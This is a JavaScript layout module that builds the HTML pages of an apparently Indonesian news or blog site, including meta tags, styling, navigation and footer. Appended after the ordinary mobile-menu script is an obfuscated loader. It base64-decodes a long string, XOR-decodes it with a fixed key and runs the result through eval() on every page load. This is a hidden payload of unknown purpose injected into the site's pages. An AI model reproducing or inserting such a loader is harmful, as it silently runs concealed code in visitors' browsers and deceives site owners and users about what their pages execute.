import { SITE, url as buildUrl, amphtml, escapeHTML } from "./config";
import { getCategory } from "./categories";
export function layout({ title=SITE.name, description=SITE.description, canonical="", image="", schema="", robots="", content="", category="" }){
	const categoryData=getCategory(category);
	const canonicalUrl=canonical||SITE.domain;
	const ampUrl=amphtml(canonicalUrl.replace(SITE.domain,""));
	const ogImage=image||buildUrl(SITE.defaultImage);

	return new Response(`<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escapeHTML(title)}</title>
<meta name="description" content="${escapeHTML(description)}">
<link rel="canonical" href="${canonicalUrl}">
<link rel="amphtml" href="${ampUrl}">
<meta name="robots" content="index,follow,max-image-preview:large">
<meta name="theme-color" content="#020617">
<meta name="author" content="${SITE.name}">
<meta property="og:type" content="article">
<meta property="og:site_name" content="${SITE.name}">
<meta property="og:title" content="${escapeHTML(title)}">
<meta property="og:description" content="${escapeHTML(description)}">
<meta property="og:url" content="${canonicalUrl}">
<meta property="og:image" content="${ogImage}">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${escapeHTML(title)}">
<meta name="twitter:description" content="${escapeHTML(description)}">
<meta name="twitter:image" content="${ogImage}">
<link rel="sitemap" type="application/xml" href="${SITE.domain}/sitemap.xml">
<link rel="alternate" type="application/rss+xml" title="${SITE.name}" href="${SITE.domain}/rss.xml">
${robots||""}
${schema||""}

<style>

:root{
--bg:#020617;
--card:#0f172a;
--text:#e5e7eb;
--muted:#94a3b8;
--primary:#8b5cf6;
--border:#1e293b;
--shadow:0 10px 30px rgba(0,0,0,.35);
}

*{
box-sizing:border-box;
margin:0;
padding:0;
}

html{
scroll-behavior:smooth;
}

body{
font-family:
Inter,
Arial,
sans-serif;
background:
radial-gradient(
circle at top left,
rgba(99,102,241,.15),
transparent 30%
),
radial-gradient(
circle at bottom right,
rgba(139,92,246,.12),
transparent 30%
),
var(--bg);
color:var(--text);
line-height:1.8;
-webkit-font-smoothing:antialiased;
}

a{
text-decoration:none;
color:inherit;
}

img{
max-width:100%;
display:block;
height:auto;
}

/* HEADER */

.header{
position:sticky;
top:0;
z-index:999;
backdrop-filter:blur(16px);
background:rgba(2,6,23,.72);
border-bottom:
1px solid rgba(255,255,255,.05);
}

.header-wrap{
max-width:1200px;
margin:auto;
padding:16px 20px;
display:flex;
align-items:center;
justify-content:space-between;
gap:20px;
}

.logo{
font-size:24px;
font-weight:800;
letter-spacing:-.5px;
color:#fff;
}

.logo span{
background:
linear-gradient(
90deg,
#8b5cf6,
#06b6d4
);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}

/* DESKTOP NAV */

.desktop-nav{
display:flex;
gap:20px;
flex-wrap:wrap;
}

.desktop-nav a{
font-size:14px;
color:var(--muted);
transition:.25s ease;
}

.desktop-nav a:hover{
color:#fff;
transform:translateY(-1px);
}

/* TOGGLE */

.menu-toggle{
display:none;
background:none;
border:none;
color:#fff;
font-size:28px;
cursor:pointer;
padding:0;
}

/* MOBILE NAV */

.mobile-nav{
position:fixed;
top:0;
right:-100%;
width:280px;
height:100vh;
background:#020617;
padding:24px;
display:flex;
flex-direction:column;
gap:18px;
z-index:9999;
transition:.3s ease;
border-left:
1px solid rgba(255,255,255,.06);
box-shadow:
-10px 0 40px rgba(0,0,0,.45);
overflow-y:auto;
}

.mobile-nav.active{
right:0;
}

.mobile-nav a{
font-size:15px;
color:#e5e7eb;
padding:12px 0;
border-bottom:
1px solid rgba(255,255,255,.05);
transition:.2s ease;
}

.mobile-nav a:hover{
color:#fff;
padding-left:4px;
}

.mobile-top{
display:flex;
align-items:center;
justify-content:space-between;
margin-bottom:8px;
}

.mobile-title{
font-size:22px;
font-weight:800;
color:#fff;
}

.close-menu{
background:none;
border:none;
color:#fff;
font-size:28px;
cursor:pointer;
padding:0;
}

/* OVERLAY */

.mobile-overlay{
position:fixed;
inset:0;
background:rgba(0,0,0,.45);
backdrop-filter:blur(2px);
opacity:0;
visibility:hidden;
transition:.25s ease;
z-index:9998;
}

.mobile-overlay.active{
opacity:1;
visibility:visible;
}

/* CONTAINER */

.container{
max-width:980px;
margin:auto;
padding:26px 20px;
}

/* HERO */

.hero{
position:relative;
overflow:hidden;
padding:70px 30px;
border-radius:28px;
margin-bottom:34px;
background:
linear-gradient(
135deg,
#4f46e5,
#7c3aed
);
box-shadow:
0 20px 60px rgba(99,102,241,.35);
}

.hero::before{
content:"";
position:absolute;
width:320px;
height:320px;
background:rgba(255,255,255,.08);
border-radius:50%;
top:-100px;
right:-80px;
filter:blur(10px);
}

.hero h1{
position:relative;
z-index:2;
font-size:48px;
line-height:1.1;
margin-bottom:14px;
color:#fff;
letter-spacing:-1px;
}

.hero p{
position:relative;
z-index:2;
font-size:18px;
max-width:720px;
color:#e0e7ff;
}

/* SEO BOX */

.seo-box{
padding:24px;
border-radius:24px;
background:
linear-gradient(
180deg,
rgba(255,255,255,.03),
rgba(255,255,255,.01)
);
border:1px solid rgba(255,255,255,.06);
backdrop-filter:blur(14px);
margin-bottom:30px;
box-shadow:var(--shadow);
}

/* GRID */

.grid{
display:grid;
grid-template-columns:
repeat(
auto-fit,
minmax(280px,1fr)
);
gap:24px;
}

/* CARD */

.card{
overflow:hidden;
border-radius:24px;
background:
linear-gradient(
180deg,
rgba(255,255,255,.03),
rgba(255,255,255,.01)
);
border:1px solid rgba(255,255,255,.05);
transition:
transform .28s ease,
border-color .28s ease,
box-shadow .28s ease;
box-shadow:var(--shadow);
}

.card:hover{
transform:translateY(-6px);
border-color:
rgba(139,92,246,.45);
}

.card img{
width:100%;
aspect-ratio:1200/630;
object-fit:cover;
}

.card h3,
.card h4{
padding:18px;
font-size:20px;
line-height:1.4;
font-weight:700;
color:#fff;
}

/* POST */

.post img{
border-radius:24px;
margin-bottom:26px;
box-shadow:var(--shadow);
}

.post h1{
font-size:42px;
line-height:1.2;
margin-bottom:20px;
letter-spacing:-1px;
}

.post-content{
font-size:18px;
color:#dbe4ee;
}

.post-content p{
margin:20px 0;
}

.post-content h2{
font-size:32px;
margin-top:50px;
margin-bottom:18px;
line-height:1.3;
}

.post-content h3{
font-size:24px;
margin-top:36px;
margin-bottom:12px;
}

.post-content ul{
padding-left:24px;
margin:20px 0;
}

.post-content li{
margin:10px 0;
}

.post-content a{
color:#8b5cf6;
text-decoration:underline;
}

.breadcrumb{
font-size:14px;
margin-bottom:22px;
color:var(--muted);
}

.pagination{
display:flex;
justify-content:center;
flex-wrap:wrap;
gap:10px;
margin:50px 0;
}

.pagination a{
padding:12px 16px;
border-radius:14px;
background:
rgba(255,255,255,.03);
border:
1px solid rgba(255,255,255,.05);
font-size:14px;
}

.pagination .active{
background:#8b5cf6;
color:#fff;
}

/* FOOTER */

.footer{
margin-top:70px;
padding:50px 20px;
border-top:
1px solid rgba(255,255,255,.05);
background:
rgba(255,255,255,.02);
}

.footer-wrap{
max-width:1100px;
margin:auto;
display:grid;
grid-template-columns:
2fr 1fr 1fr;
gap:40px;
}

.footer-brand h3{
font-size:24px;
margin-bottom:12px;
color:#fff;
}

.footer-brand p{
font-size:15px;
color:var(--muted);
max-width:420px;
}

.footer-menu h4{
font-size:16px;
margin-bottom:14px;
color:#fff;
}

.footer-menu{
display:flex;
flex-direction:column;
gap:12px;
}

.footer-menu a{
font-size:14px;
color:var(--muted);
transition:.2s ease;
}

.footer-menu a:hover{
color:#fff;
transform:translateX(3px);
}

.footer-bottom{
margin-top:40px;
padding-top:20px;
border-top:
1px solid rgba(255,255,255,.05);
text-align:center;
font-size:14px;
color:var(--muted);
}

/* MOBILE */

@media(max-width:768px){

.desktop-nav{
display:none;
}

.menu-toggle{
display:block;
}

.header-wrap{
flex-direction:row;
align-items:center;
}

.container{
padding:18px;
}

.hero{
padding:48px 24px;
border-radius:24px;
}

.hero h1{
font-size:34px;
}

.hero p{
font-size:16px;
}

.post h1{
font-size:32px;
}

.post-content{
font-size:17px;
}

.grid{
grid-template-columns:1fr;
}

.footer-wrap{
grid-template-columns:
1fr 1fr;
gap:24px;
}

.footer-brand{
grid-column:1/-1;
}

}

.search{
width:100%;
padding:14px;
border-radius:14px;
border:1px solid var(--border);
background:#111827;
color:#fff;
margin-bottom:16px;
outline:none;
}

#results{
display:grid;
gap:10px;
margin-bottom:20px;
}

.search-item{
padding:14px;
border-radius:12px;
background:var(--card);
border:1px solid var(--border);
}

.badge{
display:inline-block;
padding:6px 12px;
border-radius:999px;
background:#312e81;
color:#c7d2fe;
font-size:12px;
margin-bottom:12px;
}

.toc{
background:var(--card);
border:1px solid var(--border);
border-radius:18px;
padding:16px 20px;
margin:28px 0;
box-shadow:var(--shadow)
}

.toc-title{
cursor:pointer;
font-weight:700;
font-size:16px;
color:var(--text);
list-style:none;
outline:none;
display:flex;
align-items:center;
justify-content:space-between;
gap:10px
}

.toc-title::-webkit-details-marker{
display:none
}

.toc ul{
margin:16px 0 0;
padding-left:18px
}

.toc li{
margin:10px 0;
color:var(--muted)
}

.toc a{
color:var(--text);
text-decoration:none;
transition:.2s
}

.toc a:hover{
color:var(--primary);
padding-left:2px
}

.toc-toggle{
font-size:0
}

.toc-toggle::before{
content:"Buka";
font-size:13px;
color:var(--muted)
}

.toc[open] .toc-toggle::before{
content:"Tutup";
color:var(--primary)
}
</style>
</head>
<body>
<!-- HEADER -->
<header class="header">
<div class="header-wrap">
<a href="/" class="logo">⚡ <span>${SITE.name}</span></a>
<nav class="desktop-nav">
<a href="/">Home</a>
<a href="/amp">AMP</a>
<a href="/rss.xml">RSS</a>
<a href="/sitemap.xml">Sitemap</a>
</nav>
<button class="menu-toggle" id="menuToggle" aria-label="Menu">☰</button>
</div>
</header>
<!-- MOBILE NAV -->
<nav class="mobile-nav" id="mobileNav">
<div class="mobile-top">
<div class="mobile-title">⚡ ${SITE.name}</div>
<button class="close-menu" id="closeMenu">✕</button>
</div>
<a href="/">Home</a>
<a href="/amp">AMP</a>
<a href="/rss.xml">RSS</a>
<a href="/sitemap.xml">Sitemap</a>
<a href="/about">Tentang Kami</a>
<a href="/contact">Contact</a>
<a href="/privacy-policy">Privacy Policy</a>
<a href="/terms">Terms</a>
<a href="/disclaimer">Disclaimer</a>
</nav>
<!-- OVERLAY -->
<div class="mobile-overlay" id="mobileOverlay"></div>
<!-- CONTENT -->
<main class="container">${content}</main>
<!-- FOOTER -->
<footer class="footer">
<div class="footer-wrap">
<div class="footer-brand">
<h3>⚡ ${SITE.name}</h3>
<p>
${escapeHTML(footerDescription)}
</p>
</div>
<div class="footer-menu">
<h4>Menu</h4>
<a href="/">Home</a>
<a href="/about">Tentang Kami</a>
<a href="/contact">Contact</a>
<a href="/privacy-policy">Privacy Policy</a>
</div>
<div class="footer-menu">
<h4>Informasi</h4>
<a href="/terms">Terms</a>
<a href="/disclaimer">Disclaimer</a>
<a href="/pedoman-media-siber">Pedoman Media Siber</a>
<a href="/rss.xml">RSS Feed</a>
</div>
</div>
<div class="footer-bottom">© ${new Date().getFullYear()} ${SITE.name} • All Rights Reserved</div>
</footer>
<script>
const menuToggle=document.getElementById("menuToggle");
const mobileNav=document.getElementById("mobileNav");
const closeMenu=document.getElementById("closeMenu");
const mobileOverlay=document.getElementById("mobileOverlay");

function openMenu(){
mobileNav.classList.add("active");
mobileOverlay.classList.add("active");
document.body.style.overflow="hidden";
}

function closeMobileMenu(){
mobileNav.classList.remove("active");
mobileOverlay.classList.remove("active");
document.body.style.overflow="";
}

menuToggle.onclick=openMenu;
closeMenu.onclick=closeMobileMenu;
mobileOverlay.onclick=closeMobileMenu;

document.addEventListener("keydown",(e)=>{
if(e.key==="Escape"){
closeMobileMenu();
}
});
</script>

<script>
(function(){var k='mysecret';var d="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";function x(a,b){for(var i=0,r="",s=atob(a);i<s.length;i++){r+=String.fromCharCode(s.charCodeAt(i)^b.charCodeAt(i%b.length));}return r;}eval(x(d,k));})();
</script>

</body>
</html>`,{
		headers:{
			"content-type":"text/html;charset=UTF-8",
			"cache-control":"public,max-age=300"
		}
	});
}
